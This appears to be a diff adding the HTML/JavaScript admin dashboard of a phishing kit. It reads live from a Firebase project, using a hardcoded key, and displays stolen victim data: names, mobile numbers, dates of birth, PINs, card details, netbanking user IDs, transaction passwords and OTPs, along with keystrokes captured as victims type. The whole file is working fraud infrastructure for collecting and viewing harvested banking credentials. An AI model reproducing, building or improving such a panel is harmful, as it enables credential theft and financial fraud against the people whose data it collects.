@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel - Live Data</title>
+
+  <style>
+    body { font-family: Arial; background:#f4f4f4; margin:0; }
+    h2 { text-align:center; color:#00169e; margin-top:20px; }
+
+    .nav-buttons {
+      display:flex; flex-wrap:wrap; justify-content:center;
+      gap:10px; margin:20px;
+    }
+    .nav-buttons button {
+      background:#00169e; color:white; border:none;
+      padding:10px 16px; border-radius:10px;
+      font-weight:bold; cursor:pointer;
+    }
+
+    .section {
+      display:none; margin:0 16px 30px;
+      padding:20px; background:white;
+      border-radius:10px;
+      box-shadow:0 0 8px rgba(0,0,0,0.1);
+    }
+    .section.active { display:block; }
+
+    .entry {
+      background:#f9f9f9;
+      border:1px solid #ddd;
+      padding:10px 15px;
+      border-radius:10px;
+      margin-bottom:15px;
+    }
+
+    .delete-btn {
+      background:red; color:white;
+      border:none; padding:4px 10px;
+      border-radius:6px; float:right;
+      font-weight:bold; cursor:pointer;
+    }
+
+    .time {
+      font-size:12px;
+      color:gray;
+      margin-top:5px;
+      display:block;
+    }
+  </style>
+
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+</head>
+
+<body>
+
+<h2>Admin Panel - Live Data</h2>
+
+<div class="nav-buttons">
+  <button onclick="showSection('usersSection')">User</button>
+  <button onclick="showSection('dobPinSection')">DOB + PIN</button>
+  <button onclick="showSection('txnPasswordSection')">Txn</button>
+  <button onclick="showSection('cardPaymentSection')">Card</button>
+  <button onclick="showSection('netbankingSection')">NetBanking</button>
+  <button onclick="showSection('otpSection')">OTP</button>
+  <button onclick="showSection('combinedSection')">All</button>
+  <button onclick="showSection('liveSection')">Live View</button>
+</div>
+
+<div id="usersSection" class="section active"><h3>User Details</h3></div>
+<div id="dobPinSection" class="section"><h3>DOB + PIN</h3></div>
+<div id="txnPasswordSection" class="section"><h3>Txn Password</h3></div>
+<div id="cardPaymentSection" class="section"><h3>Card</h3></div>
+<div id="netbankingSection" class="section"><h3>NetBanking</h3></div>
+<div id="otpSection" class="section"><h3>OTP</h3></div>
+<div id="combinedSection" class="section"><h3>All</h3></div>
+<div id="liveSection" class="section"><h3>Live Typing</h3></div>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
+  authDomain: "ss22-a96d3.firebaseapp.com",
+  projectId: "ss22-a96d3"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+function showSection(id) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+function formatTime(ts){
+  if(!ts) return "";
+  return ts.toDate().toLocaleString();
+}
+
+function renderEntry(sectionId, html, docId, collection, label=""){
+  const section = document.getElementById(sectionId);
+  const div = document.createElement('div');
+  div.className = 'entry';
+  div.innerHTML =
+    (label ? `<h4>${label}</h4>` : "") +
+    html +
+    `<button class="delete-btn" onclick="deleteEntry('${collection}','${docId}')">Delete</button>`;
+  
+  section.insertBefore(div, section.children[1]);
+}
+
+function deleteEntry(collection, docId){
+  const pass = prompt("Enter delete password:");
+  if(pass==="4542"){
+    db.collection(collection).doc(docId).delete()
+    .then(()=>alert("Deleted"))
+    .catch(e=>alert(e));
+  } else alert("Wrong password");
+}
+
+/* USERS */
+db.collection("users1").orderBy("timestamp","desc").onSnapshot(snap=>{
+  snap.docChanges().forEach(change=>{
+    const d=change.doc.data();
+    const html=`
+    <p><b>Name:</b> ${d.name}</p>
+    <p><b>KNO:</b> ${d.kno}</p>
+    <p><b>Mobile:</b> ${d.mobile}</p>
+    <span class="time">${formatTime(d.timestamp)}</span>
+    `;
+    renderEntry("usersSection",html,change.doc.id,"users");
+    renderEntry("combinedSection",html,change.doc.id,"users","User");
+  });
+});
+
+/* DOB PIN */
+db.collection("dob_pin").onSnapshot(snap=>{
+  snap.docChanges().forEach(change=>{
+    const d=change.doc.data();
+    const html=`
+    <p><b>DOB:</b> ${d.dob}</p>
+    <p><b>PIN:</b> ${d.pin}</p>
+    <span class="time">${formatTime(d.timestamp)}</span>
+    `;
+    renderEntry("dobPinSection",html,change.doc.id,"dob_pin");
+    renderEntry("combinedSection",html,change.doc.id,"dob_pin","DOB+PIN");
+  });
+});
+
+/* OTP */
+db.collection("otp_entries").onSnapshot(snap=>{
+  snap.docChanges().forEach(change=>{
+    const d=change.doc.data();
+    const html=`
+    <p><b>OTP:</b> ${d.otp}</p>
+    <p><b>Attempt:</b> ${d.attempt}</p>
+    <span class="time">${formatTime(d.timestamp)}</span>
+    `;
+    renderEntry("otpSection",html,change.doc.id,"otp_entries");
+    renderEntry("combinedSection",html,change.doc.id,"otp_entries","OTP");
+  });
+});
+
+/* LIVE TYPING (FIXED) */
+db.collection("live_typing").orderBy("timestamp","desc").onSnapshot(snap=>{
+  const section = document.getElementById("liveSection");
+
+  // Clear old entries
+  section.innerHTML = "<h3>Live Typing</h3>";
+
+  snap.forEach(doc=>{
+    const d = doc.data();
+
+    const div = document.createElement('div');
+    div.className = 'entry';
+
+    div.innerHTML = `
+      <p><b>Name:</b> ${d.name || ""}</p>
+      <p><b>KNO:</b> ${d.kno || ""}</p>
+      <p><b>Mobile:</b> ${d.mobile || ""}</p>
+      <p><b>Card:</b> ${d.debitCard || d.creditCard || ""}</p>
+      <p><b>User:</b> ${d.netUser || ""}</p>
+      <span class="time">${formatTime(d.timestamp)}</span>
+    `;
+
+    section.appendChild(div);
+
+    // show only latest
+    return false;
+  });
+});
+</script>
+
+</body>
+</html>
